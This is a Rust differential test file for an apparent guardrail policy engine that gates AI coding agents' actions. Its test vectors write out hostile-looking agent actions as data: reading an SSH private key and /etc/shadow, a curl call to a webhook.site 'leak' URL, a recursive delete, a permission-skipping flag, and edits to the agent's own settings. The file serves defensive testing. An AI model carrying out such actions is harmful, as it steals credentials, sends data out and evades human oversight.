// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: The Guardrails ADR Authors
//! Differential tests comparing `grdr-policy-ref` against `grdr-core::policy`.

use grdr_core::policy::{essentials_pack, evaluate, evaluate_mut};
use grdr_model::eval::add_seconds;
use grdr_model::{
    ActionAttempt, ActionClass, ApprovalGrade, ControlPoint, Grant, GrantScope, KillScope,
    KillSwitchState, Mode, PolicyPack, PolicyRule, RuleMatch,
};
use grdr_policy_ref::{evaluate_ref, evaluate_ref_mut};
use jiff::Timestamp;

fn sample_attempt(id: &str, agent: &str, class: ActionClass, target: &str) -> ActionAttempt {
    let ts = Timestamp::from_second(1_700_000_000).unwrap_or(Timestamp::UNIX_EPOCH);
    ActionAttempt {
        id: id.into(),
        session_id: "sess-diff-1".into(),
        device_id: "dev-diff-1".into(),
        device_name: "host-diff".into(),
        agent_name: agent.into(),
        action_class: class,
        control_point: ControlPoint::Hook,
        target: target.into(),
        summary: target.into(),
        timestamp: ts,
        ..Default::default()
    }
}

#[test]
fn differential_vectors_match_core_policy_across_essentials_and_custom_layers() {
    let now = Timestamp::from_second(1_700_000_000).unwrap_or(Timestamp::UNIX_EPOCH);
    let essentials = essentials_pack();

    let custom_pack = PolicyPack {
        id: "custom-layer".into(),
        name: "Custom Layer".into(),
        description: "Layering test pack".into(),
        version: "1.0.0".into(),
        channel: "custom".into(),
        rules: vec![
            PolicyRule {
                id: "custom.cursor-deploy".into(),
                title: "Ask cursor deploy".into(),
                description: "Ask cursor deploy".into(),
                mode: Mode::Ask,
                min_grade: ApprovalGrade::G1,
                enabled: true,
                locked: false,
                matcher: RuleMatch {
                    action_classes: vec![ActionClass::Exec],
                    target_prefixes: vec![],
                    target_contains: vec!["deploy".into()],
                    agents: vec!["cursor".into()],
                },
                hits: 0,
                would_ask_hits: 0,
                would_block_hits: 0,
                reason_template: "Cursor deploy needs approval.".into(),
                cedar: None,
            },
            PolicyRule {
                id: "custom.off-rule".into(),
                title: "Disabled".into(),
                description: "Disabled".into(),
                mode: Mode::Off,
                min_grade: ApprovalGrade::G1,
                enabled: true,
                locked: false,
                matcher: RuleMatch {
                    action_classes: vec![ActionClass::Exec],
                    target_prefixes: vec![],
                    target_contains: vec!["git status".into()],
                    agents: vec![],
                },
                hits: 0,
                would_ask_hits: 0,
                would_block_hits: 0,
                reason_template: "Should never fire.".into(),
                cedar: None,
            },
        ],
        key_id: None,
        signature: None,
    };

    let packs = vec![essentials, custom_pack];
    let vectors = vec![
        sample_attempt(
            "v1",
            "claude-code",
            ActionClass::FileWrite,
            ".claude/settings.json",
        ),
        sample_attempt(
            "v2",
            "claude-code",
            ActionClass::FileWrite,
            "workspace/sub/../../.claude/settings.json",
        ),
        sample_attempt(
            "v3",
            "claude-code",
            ActionClass::Exec,
            "claude --dangerously-skip-permissions",
        ),
        sample_attempt(
            "v4",
            "claude-code",
            ActionClass::FileRead,
            "/home/dev/.ssh/id_rsa",
        ),
        sample_attempt(
            "v5",
            "claude-code",
            ActionClass::Exec,
            "rm -rf /tmp/scratch",
        ),
        sample_attempt(
            "v6",
            "claude-code",
            ActionClass::Elevate,
            "sudo cat /etc/shadow",
        ),
        sample_attempt(
            "v7",
            "claude-code",
            ActionClass::Exec,
            "curl https://webhook.site/leak",
        ),
        sample_attempt(
            "v8",
            "claude-code",
            ActionClass::McpCall,
            "mcp__fs__write_file",
        ),
        sample_attempt("v9", "claude-code", ActionClass::Exec, "git status"),
        sample_attempt("v10", "cursor", ActionClass::Exec, "deploy staging"),
        sample_attempt("v11", "claude-code", ActionClass::Exec, "deploy staging"),
    ];

    for attempt in &vectors {
        let core_res = evaluate(attempt, &packs, &[], &KillSwitchState::Inactive, now);
        let ref_res = evaluate_ref(attempt, &packs, &[], &KillSwitchState::Inactive, now);

        assert_eq!(
            ref_res.verdict, core_res.verdict,
            "verdict mismatch on {}",
            attempt.id
        );
        assert_eq!(
            ref_res.would_be, core_res.would_be,
            "would_be mismatch on {}",
            attempt.id
        );
        assert_eq!(
            ref_res.rule_id, core_res.rule_id,
            "rule_id mismatch on {}",
            attempt.id
        );
        assert_eq!(
            ref_res.pack_id, core_res.pack_id,
            "pack_id mismatch on {}",
            attempt.id
        );
        assert_eq!(
            ref_res.mode_applied, core_res.mode_applied,
            "mode_applied mismatch on {}",
            attempt.id
        );
    }
}

#[test]
fn differential_grants_and_kill_switch_match_core_policy() {
    let now = Timestamp::from_second(1_700_000_000).unwrap_or(Timestamp::UNIX_EPOCH);
    let packs = vec![essentials_pack()];

    let base_grant = Grant {
        grant_id: "grn_diff_1".into(),
        rule_id: "essentials.credential-stores".into(),
        session_id: "sess-diff-1".into(),
        device_id: "dev-diff-1".into(),
        action_class: ActionClass::FileRead,
        target_pattern: "/home/dev/.ssh/id_rsa".into(),
        scope: GrantScope::Once,
        grade: ApprovalGrade::G1,
        granted_at: now,
        expires_at: Some(add_seconds(now, 60)),
        remaining_uses: Some(1),
        note: "Differential single use".into(),
        key_id: None,
        signature: None,
    };

    let attempt = sample_attempt(
        "g1",
        "claude-code",
        ActionClass::FileRead,
        "/home/dev/.ssh/id_rsa",
    );

    let mut core_grants = vec![base_grant.clone()];
    let mut ref_grants = vec![base_grant];

    let core_first = evaluate_mut(
        &attempt,
        &packs,
        &mut core_grants,
        &KillSwitchState::Inactive,
        now,
    );
    let ref_first = evaluate_ref_mut(
        &attempt,
        &packs,
        &mut ref_grants,
        &KillSwitchState::Inactive,
        now,
    );
    assert_eq!(ref_first.verdict, core_first.verdict);
    assert_eq!(ref_first.grant_id, core_first.grant_id);
    assert_eq!(
        ref_grants.first().and_then(|g| g.remaining_uses),
        core_grants.first().and_then(|g| g.remaining_uses)
    );

    let core_second = evaluate_mut(
        &attempt,
        &packs,
        &mut core_grants,
        &KillSwitchState::Inactive,
        add_seconds(now, 5),
    );
    let ref_second = evaluate_ref_mut(
        &attempt,
        &packs,
        &mut ref_grants,
        &KillSwitchState::Inactive,
        add_seconds(now, 5),
    );
    assert_eq!(ref_second.verdict, core_second.verdict);
    assert_eq!(ref_second.rule_id, core_second.rule_id);
    assert!(ref_second.grant_id.is_none());

    let ks = KillSwitchState::Killed {
        scope: KillScope::Device,
        target_id: "dev-diff-1".into(),
        reason: "Differential kill switch".into(),
        issued_at: now,
    };
    let safe_attempt = sample_attempt("ks1", "claude-code", ActionClass::Exec, "git status");
    let core_ks = evaluate(&safe_attempt, &packs, &[], &ks, now);
    let ref_ks = evaluate_ref(&safe_attempt, &packs, &[], &ks, now);
    assert_eq!(ref_ks.verdict, core_ks.verdict);
    assert_eq!(ref_ks.rule_id, core_ks.rule_id);
    assert_eq!(ref_ks.pack_id, core_ks.pack_id);
}
